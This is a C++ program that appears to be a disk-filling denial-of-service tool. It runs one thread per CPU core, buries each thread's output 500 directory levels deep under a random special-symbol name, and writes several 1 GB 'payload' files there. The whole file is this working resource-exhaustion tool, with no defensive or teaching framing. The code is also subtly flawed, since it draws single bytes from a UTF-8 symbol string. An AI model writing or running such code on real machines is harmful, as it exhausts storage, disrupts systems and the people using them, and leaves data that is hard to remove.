#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <thread>
#include <random>
namespace fs = std::filesystem;

void make_tunnel_and_payloads(int id, std::string ranfilenames, int depth, size_t fileSizeGB, int filesPerTunnel) {
    // Unique root per thread
    fs::path root = ranfilenames;
    fs::create_directory(root);

    // Drill deep
    fs::path current = root;
    for (int i = 0; i < depth; i++) {
        current /= "sub";
        fs::create_directory(current);
    }

    // 100 MB buffer for writing
    const size_t chunkSize = 100 * 1024 * 1024;
    std::vector<char> buffer(chunkSize, 'X');

    // Write multiple files at the bottom
    for (int f = 0; f < filesPerTunnel; f++) {
        fs::path bigfile = current / ("payload_" + std::to_string(f) + ".bin");
        std::ofstream file(bigfile, std::ios::binary);

        size_t chunks = (fileSizeGB * 1024ULL) / 100; // number of 100MB writes

        for (size_t i = 0; i < chunks; i++) {
            file.write(buffer.data(), buffer.size());
        }
    }

    std::cout << "Thread " << id
    << " wrote " << filesPerTunnel
    << " files of " << fileSizeGB << " GB each at " << current << "\n";
}



std::string generateSpecialSymbolString(int length) {
    // The pool of special symbols.
    // Ensure your source file is saved with UTF-8 encoding for these characters to be read correctly.
    const std::string symbols = "`~§°±µ¶·¿¡¢£¤¥¦©®¬¯×÷";

    // 1. Set up the random number generator.
    // We use a static engine to ensure it's seeded only once, improving performance
    // and randomness on subsequent calls.
    static std::mt19937 engine(std::chrono::high_resolution_clock::now().time_since_epoch().count());

    // 2. Create a distribution that will uniformly select an index from our symbols string.
    std::uniform_int_distribution<int> distribution(0, symbols.length() - 1);

    // 3. Build the result string.
    std::string result;
    result.reserve(length); // Pre-allocate memory for efficiency

    for (int i = 0; i < length; ++i) {
        // Generate a random index and append the corresponding symbol.
        result += symbols[distribution(engine)];
    }

    return result;
}


int main() {
    const int numThreads = std::thread::hardware_concurrency();
    const int depth = 500;   // subdirectory levels
    const size_t fileSizeGB = 1; // per payload
    const int filesPerTunnel = 5; // number of payloads per thread


    std::random_device rd;

    // Seed a high-quality generator (Mersenne Twister)
    std::mt19937 generator(rd());

    // Create a distribution
    std::uniform_int_distribution<int> distribution(16, 32);

    std::vector<std::thread> threads;


    for (int i = 0; i < numThreads; i++) {
        threads.emplace_back(make_tunnel_and_payloads,i, generateSpecialSymbolString(distribution(generator)) , depth, fileSizeGB, filesPerTunnel);
    }

    for (auto& t : threads) {
        t.join();
    }

    std::cout << "Done: " << numThreads << " tunnels with "
    << filesPerTunnel << " payloads each.\n";
    return 0;
}
